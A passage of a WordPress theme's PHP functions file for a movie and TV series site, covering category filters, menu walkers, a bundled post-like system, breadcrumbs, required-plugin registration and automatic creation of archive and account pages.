	$cond[1] = (!empty($exclude1)) ? $exclude1 : 1;
	$cond[2] = (!empty($exclude2)) ? $exclude2 : 1;
	$cond[3] = (!empty($exclude3)) ? $exclude3 : 1;
	$cond[4] = (!empty($exclude4)) ? $exclude4 : 1;
	$cond[5] = (!empty($exclude5)) ? $exclude5 : 1;
	$cond[6] = (!empty($exclude6)) ? $exclude6 : 1;
	$hide_cat = get_option('estrenos_cat');
    // define which category IDs you want to hide
    $excludeIDs = array($cond[0], $cond[1], $cond[2], $cond[3], $cond[4], $cond[5], $cond[6]);

    // get all the terms 
    $exclude = array();
    foreach ($excludeIDs as $id) {
        $exclude[] = get_term_by('id', $id, 'category');
    }

    // filter the categories
    if (!is_admin()) {
        foreach($terms as $key => $term){
            if($term->taxonomy == "category"){
                foreach ($exclude as $exKey => $exTerm) {
                    if($term->term_id == $exTerm->term_id) unset($terms[$key]);
                }
            }
        }
    }

    return $terms;
}


function namespace_add_custom_types( $query ) {
  if( is_category() || is_tag() && empty( $query->query_vars['suppress_filters'] ) ) {
    $query->set( 'post_type', array(
     'post', 'nav_menu_item', 'tvshows', 'episodes'
		));
	  return $query;
	}
}
add_filter( 'pre_get_posts', 'namespace_add_custom_types' );

function psy_posts_per_page_artcles( $query ) {
	$ppp = get_option('article-archive-posts');
  if ( !is_admin() && $query->is_main_query() && is_post_type_archive( 'noticias' ) ) {
    $query->set( 'posts_per_page', $ppp);
  }
}
add_action( 'pre_get_posts', 'psy_posts_per_page_artcles' );

function psy_posts_per_page_notices( $query ) {
	$ppp = get_option('article-archive-posts');
  if ( !is_admin() && $query->is_main_query() && is_post_type_archive( 'notices' ) ) {
    $query->set( 'posts_per_page', $ppp);
  }
}
add_action( 'pre_get_posts', 'psy_posts_per_page_notices' );

function replace_featured_image_box()  
{  
    remove_meta_box( 'postimagediv', 'noticias', 'side' );  
    add_meta_box('postimagediv', __('Article Thumbnail'), 'post_thumbnail_meta_box', 'noticias', 'side', 'low');  
}  
add_action('do_meta_boxes', 'replace_featured_image_box');  

class WPSE_78121_Sublevel_Walker extends Walker_Nav_Menu
{
function start_lvl( &$output, $depth = 0, $args = array() ) {
$indent = str_repeat("\t", $depth);
$output .= "\n$indent<div class='sub-container' style='display: none;'><ul class='sub-menu'>\n";
}
function end_lvl( &$output, $depth = 0, $args = array() ) {
$indent = str_repeat("\t", $depth);
$output .= "$indent</ul></div>\n";
}
}



function wpse45700_get_menu_by_location( $location ) {
    if( empty($location) ) return false;

    $locations = get_nav_menu_locations();
    if( ! isset( $locations[$location] ) ) return false;

    $menu_obj = get_term( $locations[$location], 'nav_menu' );

    return $menu_obj;
}





class Walker_Quickstart_Menu extends Walker_Nav_Menu {

    // Tell Walker where to inherit it's parent and id values
    var $db_fields = array(
        'parent' => 'menu_item_parent', 
        'id'     => 'db_id' 
    );

    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 ) {
        $output .= sprintf( "\n<p><a href='%s'%s>%s</a></p>\n",
            $item->url,
            ( $item->object_id === get_the_ID() ) ? '' : '',
            $item->title
        );
    }

}




require_once( get_template_directory() .'/better-comments.php' );

wp_list_comments( array(
	'callback' => 'better_comments'
) );

// add_filter( 'wp_default_editor', function() { return "html"; } );


function favorite_buttons() { ?>
<?php if(get_option('favorite-settings') == "true") {?>
<?php if(get_option('fav-allow-settings') == "1") { ?>
<?php echo favorite_user_only(); ?>
<?php } elseif(get_option('fav-allow-settings') == "2") { ?>
<?php echo get_simple_likes_button( get_the_ID() ); ?>
<?php }?>
<?php }?>
<?php }













function favorite_user_guest(){ ?>
<?php  echo get_simple_likes_button( get_the_ID() ); ?>
<?php }

function favorite_user_only(){?>
<?php if (is_user_logged_in()) {  echo get_simple_likes_button( get_the_ID() );  ?> 
<?php }else { echo guest_fav_button(); ?>
<?php }?>
<?php }



function guest_fav_button() { ?>
<a href="#pt-login" class="sl-button btn bp-btn-favorite"><i class="fa fa-heart"></i> <span><?php _e('Favorite','psythemes');?></span></a>
<?php }


/*
Name:  WordPress Post Like System
Description:  A simple and efficient post like system for WordPress.
Version:      0.5.2
Author:       Jon Masterson
Author URI:   http://jonmasterson.com/
License:
Copyright (C) 2015 Jon Masterson
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/**
 * Register the stylesheets for the public-facing side of the site.
 * @since    0.5
 */


/**
 * Processes like/unlike
 * @since    0.5
 */
add_action( 'wp_ajax_nopriv_process_simple_like', 'process_simple_like' );
add_action( 'wp_ajax_process_simple_like', 'process_simple_like' );
function process_simple_like() {
	// Security
	$nonce = isset( $_REQUEST['nonce'] ) ? sanitize_text_field( $_REQUEST['nonce'] ) : 0;
	if ( !wp_verify_nonce( $nonce, 'simple-likes-nonce' ) ) {
		exit( __( 'Not permitted', 'psythemes' ) );
	}
	// Test if javascript is disabled
	$disabled = ( isset( $_REQUEST['disabled'] ) && $_REQUEST['disabled'] == true ) ? true : false;
	// Test if this is a comment
	$is_comment = ( isset( $_REQUEST['is_comment'] ) && $_REQUEST['is_comment'] == 1 ) ? 1 : 0;
	// Base variables
	$post_id = ( isset( $_REQUEST['post_id'] ) && is_numeric( $_REQUEST['post_id'] ) ) ? $_REQUEST['post_id'] : '';
	$result = array();
	$post_users = NULL;
	$like_count = 0;
	// Get plugin options
	if ( $post_id != '' ) {
		$count = ( $is_comment == 1 ) ? get_comment_meta( $post_id, "_comment_like_count", true ) : get_post_meta( $post_id, "_post_like_count", true ); // like count
		$count = ( isset( $count ) && is_numeric( $count ) ) ? $count : 0;
		if ( !already_liked( $post_id, $is_comment ) ) { // Like the post
			if ( is_user_logged_in() ) { // user is logged in
				$user_id = get_current_user_id();
				$post_users = post_user_likes( $user_id, $post_id, $is_comment );
				if ( $is_comment == 1 ) {
					// Update User & Comment
					$user_like_count = get_user_option( "_comment_like_count", $user_id );
					$user_like_count =  ( isset( $user_like_count ) && is_numeric( $user_like_count ) ) ? $user_like_count : 0;
					update_user_option( $user_id, "_comment_like_count", ++$user_like_count );
					if ( $post_users ) {
						update_comment_meta( $post_id, "_user_comment_liked", $post_users );
					}
				} else {
					// Update User & Post
					$user_like_count = get_user_option( "_user_like_count", $user_id );
					$user_like_count =  ( isset( $user_like_count ) && is_numeric( $user_like_count ) ) ? $user_like_count : 0;
					update_user_option( $user_id, "_user_like_count", ++$user_like_count );
					if ( $post_users ) {
						update_post_meta( $post_id, "_user_liked", $post_users );
					}
				}
			} else { // user is anonymous
				$user_ip = sl_get_ip();
				$post_users = post_ip_likes( $user_ip, $post_id, $is_comment );
				// Update Post
				if ( $post_users ) {
					if ( $is_comment == 1 ) {
						update_comment_meta( $post_id, "_user_comment_IP", $post_users );
					} else { 
						update_post_meta( $post_id, "_user_IP", $post_users );
					}
				}
			}
			$like_count = ++$count;
			$response['status'] = "liked";
			$response['icon'] = get_liked_icon();
		} else { // Unlike the post
			if ( is_user_logged_in() ) { // user is logged in
				$user_id = get_current_user_id();
				$post_users = post_user_likes( $user_id, $post_id, $is_comment );
				// Update User
				if ( $is_comment == 1 ) {
					$user_like_count = get_user_option( "_comment_like_count", $user_id );
					$user_like_count =  ( isset( $user_like_count ) && is_numeric( $user_like_count ) ) ? $user_like_count : 0;
					if ( $user_like_count > 0 ) {
						update_user_option( $user_id, "_comment_like_count", --$user_like_count );
					}
				} else {
					$user_like_count = get_user_option( "_user_like_count", $user_id );
					$user_like_count =  ( isset( $user_like_count ) && is_numeric( $user_like_count ) ) ? $user_like_count : 0;
					if ( $user_like_count > 0 ) {
						update_user_option( $user_id, '_user_like_count', --$user_like_count );
					}
				}
				// Update Post
				if ( $post_users ) {	
					$uid_key = array_search( $user_id, $post_users );
					unset( $post_users[$uid_key] );
					if ( $is_comment == 1 ) {
						update_comment_meta( $post_id, "_user_comment_liked", $post_users );
					} else { 
						update_post_meta( $post_id, "_user_liked", $post_users );
					}
				}
			} else { // user is anonymous
				$user_ip = sl_get_ip();
				$post_users = post_ip_likes( $user_ip, $post_id, $is_comment );
				// Update Post
				if ( $post_users ) {
					$uip_key = array_search( $user_ip, $post_users );
					unset( $post_users[$uip_key] );
					if ( $is_comment == 1 ) {
						update_comment_meta( $post_id, "_user_comment_IP", $post_users );
					} else { 
						update_post_meta( $post_id, "_user_IP", $post_users );
					}
				}
			}
			$like_count = ( $count > 0 ) ? --$count : 0; // Prevent negative number
			$response['status'] = "unliked";
			$response['icon'] = get_unliked_icon();
		}
		if ( $is_comment == 1 ) {
			update_comment_meta( $post_id, "_comment_like_count", $like_count );
			update_comment_meta( $post_id, "_comment_like_modified", date( 'Y-m-d H:i:s' ) );
		} else { 
			update_post_meta( $post_id, "_post_like_count", $like_count );
			update_post_meta( $post_id, "_post_like_modified", date( 'Y-m-d H:i:s' ) );
		}
		$response['count'] = get_like_count( $like_count );
		$response['testing'] = $is_comment;
		if ( $disabled == true ) {
			if ( $is_comment == 1 ) {
				wp_redirect( get_permalink( get_the_ID() ) );
				exit();
			} else {
				wp_redirect( get_permalink( $post_id ) );
				exit();
			}
		} else {
			wp_send_json( $response );
		}
	}
}

/**
 * Utility to test if the post is already liked
 * @since    0.5
 */
function already_liked( $post_id, $is_comment ) {
	$post_users = NULL;
	$user_id = NULL;
	if ( is_user_logged_in() ) { // user is logged in
		$user_id = get_current_user_id();
		$post_meta_users = ( $is_comment == 1 ) ? get_comment_meta( $post_id, "_user_comment_liked" ) : get_post_meta( $post_id, "_user_liked" );
		if ( count( $post_meta_users ) != 0 ) {
			$post_users = $post_meta_users[0];
		}
	} else { // user is anonymous
		$user_id = sl_get_ip();
		$post_meta_users = ( $is_comment == 1 ) ? get_comment_meta( $post_id, "_user_comment_IP" ) : get_post_meta( $post_id, "_user_IP" ); 
		if ( count( $post_meta_users ) != 0 ) { // meta exists, set up values
			$post_users = $post_meta_users[0];
		}
	}
	if ( is_array( $post_users ) && in_array( $user_id, $post_users ) ) {
		return true;
	} else {
		return false;
	}
} // already_liked()

/**
 * Output the like button
 * @since    0.5
 */
function get_simple_likes_button( $post_id, $is_comment = NULL ) {
	$is_comment = ( NULL == $is_comment ) ? 0 : 1;
	$output = '';
	$nonce = wp_create_nonce( 'simple-likes-nonce' ); // Security
	if ( $is_comment == 1 ) {
		$post_id_class = esc_attr( ' sl-comment-button-' . $post_id );
		$comment_class = esc_attr( ' sl-comment' );
		$like_count = get_comment_meta( $post_id, "_comment_like_count", true );
		$like_count = ( isset( $like_count ) && is_numeric( $like_count ) ) ? $like_count : 0;
	} else {
		$post_id_class = esc_attr( ' sl-button-' . $post_id );
		$comment_class = esc_attr( '' );
		$like_count = get_post_meta( $post_id, "_post_like_count", true );
		$like_count = ( isset( $like_count ) && is_numeric( $like_count ) ) ? $like_count : 0;
	}
	$count = get_like_count( $like_count );
	$icon_empty = get_unliked_icon();
	$icon_full = get_liked_icon();
	// Loader
	$loader = '<span id="sl-loader"></span>';
	// Liked/Unliked Variables
	if ( already_liked( $post_id, $is_comment ) ) {
		$class = esc_attr( ' liked' );
		$title = __( 'Remove Favorite', 'psythemes' );
		$icon = $icon_full;
	} else {
		$class = '';
		$title = __( 'Favorite', 'psythemes' );
		$icon = $icon_empty;
	}
	$output = '<a href="javascript:void(0)" class="sl-button btn bp-btn-like' . $post_id_class . $class . $comment_class . '" data-nonce="' . $nonce . '" data-post-id="' . $post_id . '" data-iscomment="' . $is_comment . '" title="' . $title . '">' . $icon . $count . '</a>' . $loader . '';
	return $output;
} // get_simple_likes_button()

/**
 * Processes shortcode to manually add the button to posts
 * @since    0.5
 */
add_shortcode( 'jmliker', 'sl_shortcode' );
function sl_shortcode() {
	return get_simple_likes_button( get_the_ID(), 0 );
} // shortcode()

/**
 * Utility retrieves post meta user likes (user id array), 
 * then adds new user id to retrieved array
 * @since    0.5
 */
function post_user_likes( $user_id, $post_id, $is_comment ) {
	$post_users = '';
	$post_meta_users = ( $is_comment == 1 ) ? get_comment_meta( $post_id, "_user_comment_liked" ) : get_post_meta( $post_id, "_user_liked" );
	if ( count( $post_meta_users ) != 0 ) {
		$post_users = $post_meta_users[0];
	}
	if ( !is_array( $post_users ) ) {
		$post_users = array();
	}
	if ( !in_array( $user_id, $post_users ) ) {
		$post_users['user-' . $user_id] = $user_id;
	}
	return $post_users;
} // post_user_likes()

/**
 * Utility retrieves post meta ip likes (ip array), 
 * then adds new ip to retrieved array
 * @since    0.5
 */
function post_ip_likes( $user_ip, $post_id, $is_comment ) {
	$post_users = '';
	$post_meta_users = ( $is_comment == 1 ) ? get_comment_meta( $post_id, "_user_comment_IP" ) : get_post_meta( $post_id, "_user_IP" );
	// Retrieve post information
	if ( count( $post_meta_users ) != 0 ) {
		$post_users = $post_meta_users[0];
	}
	if ( !is_array( $post_users ) ) {
		$post_users = array();
	}
	if ( !in_array( $user_ip, $post_users ) ) {
		$post_users['ip-' . $user_ip] = $user_ip;
	}
	return $post_users;
} // post_ip_likes()

/**
 * Utility to retrieve IP address
 * @since    0.5
 */
function sl_get_ip() {
	if ( isset( $_SERVER['HTTP_CLIENT_IP'] ) && ! empty( $_SERVER['HTTP_CLIENT_IP'] ) ) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif ( isset( $_SERVER['HTTP_X_FORWARDED_FOR'] ) && ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
		$ip = ( isset( $_SERVER['REMOTE_ADDR'] ) ) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
	}
	$ip = filter_var( $ip, FILTER_VALIDATE_IP );
	$ip = ( $ip === false ) ? '0.0.0.0' : $ip;
	return $ip;
} // sl_get_ip()

/**
 * Utility returns the button icon for "like" action
 * @since    0.5
 */
function get_liked_icon() {
	/* If already using Font Awesome with your theme, replace svg with: <i class="fa fa-heart"></i> */
	$icon = '<i class="fa fa-heart"></i>';
	return $icon;
} // get_liked_icon()

/**
 * Utility returns the button icon for "unlike" action
 * @since    0.5
 */
function get_unliked_icon() {
	/* If already using Font Awesome with your theme, replace svg with: <i class="fa fa-heart-o"></i> */
	$icon = '<i class="fa fa-heart"></i>';
	return $icon;
} // get_unliked_icon()

/**
 * Utility function to format the button count,
 * appending "K" if one thousand or greater,
 * "M" if one million or greater,
 * and "B" if one billion or greater (unlikely).
 * $precision = how many decimal points to display (1.25K)
 * @since    0.5
 */
function sl_format_count( $number ) {
	$precision = 2;
	if ( $number >= 1000 && $number < 1000000 ) {
		$formatted = number_format( $number/1000, $precision ).'K';
	} else if ( $number >= 1000000 && $number < 1000000000 ) {
		$formatted = number_format( $number/1000000, $precision ).'M';
	} else if ( $number >= 1000000000 ) {
		$formatted = number_format( $number/1000000000, $precision ).'B';
	} else {
		$formatted = $number; // Number is less than 1000
	}
	$formatted = str_replace( '.00', '', $formatted );
	return $formatted;
} // sl_format_count()

/**
 * Utility retrieves count plus count options, 
 * returns appropriate format based on options
 * @since    0.5
 */
function get_like_count( $like_count ) {
	$like_text = __( '', 'psythemes' );
	if ( is_numeric( $like_count ) && $like_count > 0 ) { 
		$number = sl_format_count( $like_count );
	} else {
		$number = $like_text;
	}
	$count = __('Favorite');
	return $count;
} // get_like_count()

// User Profile List
add_action( 'show_user_profile', 'show_user_likes' );
add_action( 'edit_user_profile', 'show_user_likes' );
function show_user_likes( $user ) { ?>        
<h2><?php _e( 'Favorites', 'psythemes' ); ?></</h2>
	<table class="form-table">
		<tr>
			<th><label for="user_likes"><?php _e( 'Your Favorites:', 'psythemes' ); ?></label></th>
			<td>
			<?php
			$types = get_post_types( array( 'public' => true ) );
			$args = array(
			  'numberposts' => -1,
			  'post_type' => $types,
			  'meta_query' => array (
				array (
				  'key' => '_user_liked',
				  'value' => $user->ID,
				  'compare' => 'LIKE'
				)
			  ) );		
			$sep = '';
			$like_query = new WP_Query( $args );
			if ( $like_query->have_posts() ) : ?>
			<p>
			<?php while ( $like_query->have_posts() ) : $like_query->the_post(); 
			echo $sep; ?><a href="<?php the_permalink(); ?>" title="<?php the_title_attribute(); ?>"><?php the_title(); ?></a>
			<?php
			$sep = ' &middot; ';
			endwhile; 
			?>
			</p>
			<?php else : ?>
			<p><?php _e( 'You do not like anything yet.', 'psythemes' ); ?></p>
			<?php 
			endif; 
			wp_reset_postdata(); 
			?>
			</td>
		</tr>
	</table>
<?php }  // show_user_likes()
function custom_rating_image_extension() {
    return 'png';
}
add_filter( 'wp_postratings_image_extension', 'custom_rating_image_extension' );

function meta_image() {?>
<meta property="og:image:width" content="300"/>
<meta property="og:image:height" content="425"/>
<meta property="og:image:type" content="image/jpeg"/>
<?php }

add_filter('get_the_archive_title', function ($title) {
    return preg_replace('/^\w+: /', '', $title);
});

if(!function_exists('psythemes_breadcrumbs')) {
	function psythemes_breadcrumbs() {
		if(is_single() || is_archive(array('noticias','notices'))) {
		$series = episodios_get_meta('serie');
		$serie_slug = sanitize_title($series);	
		if(is_singular('post')) {
			$ptype = __('Movies');
			$ptype_url = get_option('mov_archive');
		}elseif(is_singular('tvshows')) {
			$ptype = __('TV Series');
			$ptype_url = esc_url(home_url('/series/'));
		}elseif(is_singular('episodes')) {
			if(!empty($series)) : $ptype = $series; else : $ptype = __('TV Series'); endif;
			if(!empty($series)) : $ptype_url = esc_url(home_url('/series/'.$serie_slug)); else : $ptype_url = esc_url(home_url('/series/')); endif;
		}elseif(is_singular('noticias')){
			$ptype = __('Articles');
			$ptype_url = esc_url(home_url('/articles/'));
		}elseif(is_singular('notices')){
			$ptype = __('Site Notices');
			$ptype_url = esc_url(home_url('/notice/'));
		}
		if(is_archive()) {
			$title = get_the_archive_title();
		}else {
			$title = get_the_title();
		}
		$cond[0] = (is_single()) ? '<li><a href="'  .$ptype_url.  '">'.$ptype.' </a></li>' : '';
		echo '<div id="bread">
		<ol class="breadcrumb" itemtype="https://schema.org/BreadcrumbList" itemscope>
		<li itemtype="https://schema.org/ListItem" itemscope itemprop="itemListElement"><a itemprop="item" href="'.esc_url(home_url()).'">'. __('Home') . ' </a></li>'.$cond[0].'<li class="active">'.$title.'</li></ol></div>';
		}	
	}
}

function star_rating() {?>
<div id="movie-mark" class="btn btn-danger averagerate"><?php if($noners = get_post_meta( get_the_ID(), 'ratings_average', true ) ) { echo $noners; ?><?php } else { echo '0' ?><?php }?></div>
<label id="movie-rating"><?php _e('Rating');?> <?php if($noners = get_post_meta( get_the_ID(), 'ratings_users', true ) ) { ?>(<?php echo $noners; ?>)<?php } else { ?>(0)<?php }?></label>
<?php if(function_exists('the_ratings')) { the_ratings(); } ?>

<?php }
require get_template_directory() . '/includes/parts/modal/membership.php';

require_once dirname( __FILE__ ) . '/tgm-init.php';

add_action( 'tgmpa_register', 'my_theme_register_required_plugins' );

function my_theme_register_required_plugins() {
	/*
	 * Array of plugin arrays. Required keys are name and slug.
	 * If the source is NOT from the .org repo, then source is also required.
	 */
	$plugins = array(

		// This is an example of how to include a plugin bundled with a theme.
		array(
			'name'               => 'WP-PostRatings Plugin', // The plugin name.
			'slug'               => 'wp-postratings', // The plugin slug (typically the folder name).
			'source'             => get_stylesheet_directory() . '/includes/plugins/wp-postratings.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '1.84', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		array(
			'name'               => 'WP-Postviews Plugin', // The plugin name.
			'slug'               => 'wp-postviews', // The plugin slug (typically the folder name).
			'source'             => get_stylesheet_directory() . '/includes/plugins/wp-postviews.zip', // The plugin source.
			'required'           => true, // If false, the plugin is only 'recommended' instead of required.
			'version'            => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher. If the plugin version is higher than the plugin version installed, the user will be notified to update the plugin.
			'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
			'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
			'external_url'       => '', // If set, overrides default API URL and points to an external URL.
			'is_callable'        => '', // If set, this callable will be be checked for availability to determine if a plugin is active.
		),
		$config = array(
		'id'           => 'tgmpa',                 // Unique ID for hashing notices for multiple instances of TGMPA.
		'default_path' => '',                      // Default absolute path to bundled plugins.
		'menu'         => 'tgmpa-install-plugins', // Menu slug.
		'parent_slug'  => 'themes.php',            // Parent menu slug.
		'capability'   => 'edit_theme_options',    // Capability needed to view plugin install page, should be a capability associated with the parent menu used.
		'has_notices'  => true,                    // Show admin notices or not.
		'dismissable'  => false,                    // If false, a user cannot dismiss the nag message.
		'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
		'is_automatic' => true,                   // Automatically activate plugins after installation or not.
		'message'      => '',                      // Message to output right before the plugins table.
		),
);

	tgmpa( $plugins, $config );
}



function psythemescast_the_terms( $post_id, $taxonomy_slug) {
    $terms = get_the_terms( $post_id, $taxonomy_slug );
    $separator = sprintf( '', esc_html( $separator ) );

    if ( ! $terms || is_wp_error( $terms ) ) {
        return false;
    }

    $links = array();

    foreach ( $terms as $term ) {
        $links[] = sprintf( '<span><a href="%2$s">%3$s</a>,</span> ',
            esc_attr( $term->slug ),
            esc_url( get_term_link( $term->slug, $taxonomy_slug ) ),
            esc_html( $term->name )
        );
    } 
    ?>
    
        <?php echo implode( $separator, $links ); ?>
    <?php
}

function psyplay_login() {
echo '<link rel="stylesheet" type="text/css" href="' . get_bloginfo('stylesheet_directory') . '/assets/css/admin/main.css" />';
}
add_action('login_head', 'psyplay_login');



function the_url( $url ) {
    return get_bloginfo( 'url' );
}
 
add_filter( 'login_headerurl', 'the_url' );





if(is_admin() and current_user_can('administrator')){
	// Request
	$page_requests = get_option('request_page');
	if(empty($page_requests)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Movies Request','psythemes'),
		  'post_title'     => __('Movies Request','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'requests.php'
		)); 
		$get_00 = get_option('siteurl').'/' . sanitize_title(__('Request','psythemes')).'/';
		update_option('request_page', $get_00);
	}
	//HOME
		$page_home = get_option('psy_home');
	if(empty($page_home)){
		$sitename = get_bloginfo('name');
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __($sitename,'psythemes'),
		  'post_title'     => __($sitename,'psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'psy_home.php'
		)); 
		$get_01 = get_option('siteurl').'/' . sanitize_title(__($sitename,'psythemes')).'/';
		update_option('psy_home', $get_01);
	}
	// Top IMDb Page
	$page_topimdb = get_option('topimdb_archive');
	if(empty($page_topimdb)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Top IMDb','psythemes'),
		  'post_title'     => __('Top IMDb','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'top_imdb.php'
		)); 
		$get_01 = get_option('siteurl').'/' . sanitize_title(__('Top IMDb','psythemes')).'/';
		update_option('topimdb_archive', $get_01);
	}
		// Most Rating Page
	$page_mostrating = get_option('mrat_archive');
	if(empty($page_mostrating)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Most Rating','psythemes'),
		  'post_title'     => __('Most Rating','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'top_ratings.php'
		)); 
		$get_02 = get_option('siteurl').'/' . sanitize_title(__('Most Rating','psythemes')).'/';
		update_option('mrat_archive', $get_02);
	}
		// Most Favorite Page
	$page_mostfavorite = get_option('mfav_archive');
	if(empty($page_mostfavorite)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Most Favorites','psythemes'),
		  'post_title'     => __('Most Favorites','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'top_favorites.php'
		)); 
		$get_03 = get_option('siteurl').'/' . sanitize_title(__('Most Favorites','psythemes')).'/';
		update_option('mfav_archive', $get_03);
	}
	
			// Most Viewed Page
	$page_mostviewed = get_option('mviewed_archive');
	if(empty($page_mostviewed)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Most Viewed','psythemes'),
		  'post_title'     => __('Most Viewed','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'top_views.php'
		)); 
		$get_04 = get_option('siteurl').'/' . sanitize_title(__('Most Viewed','psythemes')).'/';
		update_option('mviewed_archive', $get_04);
	}
	
				// Movies Page
	$page_movies = get_option('mov_archive');
	if(empty($page_movies)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Movies','psythemes'),
		  'post_title'     => __('Movies','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'archive-movies.php'
		)); 
		$get_05 = get_option('siteurl').'/' . sanitize_title(__('Movies','psythemes')).'/';
		update_option('mov_archive', $get_05);
	}
	
				// Account Page
	$page_account = get_option('account_page');
	if(empty($page_account)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Account','psythemes'),
		  'post_title'     => __('Account','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'pages/account.php'
		)); 
		$get_06 = get_option('siteurl').'/' . sanitize_title(__('Account','psythemes')).'/';
		update_option('account_page', $get_06);
	}
	
	
					// Keywords Page
	$page_account = get_option('keywords_archive');
	if(empty($page_account)){
		$post_id = wp_insert_post(array(
		  'post_content'   => '',
		  'post_name'      => __('Keywords','psythemes'),
		  'post_title'     => __('Keywords','psythemes'),
		  'post_status'    => 'publish',
		  'post_type'      => 'page',
		  'ping_status'    => 'closed',
		  'post_date'      => date('Y-m-d H:i:s'),
		  'post_date_gmt'  => date('Y-m-d H:i:s'),
		  'comment_status' => 'closed',
		  'page_template'  => 'archive-keywords.php'
		)); 
		$get_06 = get_option('siteurl').'/' . sanitize_title(__('Keywords','psythemes')).'/';
		update_option('keywords_archive', $get_06);
	}
}


add_action( 'login_form_middle', 'add_lost_password_link' );

function add_lost_password_link() {
$url = wp_lostpassword_url();
return '<a href="'.$url.'" class="forgot_pass">Lost Password?</a>';
}



add_action( 'login_form_bottom', 'register_button' );
function register_button() {
	$url = get_option('account_page');
	return '<p class="login-create-account"><a href="'. $url .'?action=register"><span>Create Account</span></a></p>';
}

